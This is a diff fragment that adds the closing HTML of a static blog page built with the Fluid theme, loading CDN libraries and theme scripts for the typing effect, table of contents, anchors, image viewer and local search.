+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.2/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">Blog works best with JavaScript enabled</div>
+  </noscript>
+</body>
+</html>
